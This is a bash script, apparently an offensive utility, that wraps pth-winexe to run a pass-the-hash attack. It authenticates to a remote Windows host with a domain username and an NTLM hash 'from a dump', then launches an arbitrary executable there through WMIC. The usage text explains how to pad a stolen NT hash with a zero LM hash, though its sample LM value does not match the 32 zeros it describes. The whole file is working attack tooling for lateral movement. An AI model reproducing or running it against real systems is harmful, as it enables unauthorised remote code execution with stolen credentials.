#!/bin/bash

ShowUsage() {
	echo "Usage: $0 <target system> <username> <password hash> <full local path to executable>"
	echo "Username should be <DOMAIN>/<User>"
	echo "For Example, if you copy an exe to the user's c:\users\<username> directory:"
	echo "$0 TargetSystem.mydomain.local MYDOMAIN/SomeUser Hash \"c:\Users\<username>\myexe.exe\""
	echo ""
	echo "Note:  IF you only have the NTLM hash from a dump, you can still do this, just put 32 zeros as the LM hash like this:"
	echo "000000000000000000000000000000030:51d6cfe7d16ee931b73c59d7e0c088c1"
}

if [ $# -lt 4 ]; then
	ShowUsage
	exit 1
fi

TARGET=$1
USERNAME=$2
PASSWORD="$3"
EXECUTABLE="$4"

# -d 6 is a debug level setting so you can see what's going on
pth-winexe -d 6 -U $USERNAME%$PASSWORD //$TARGET "wmic process call create \"$EXECUTABLE\""
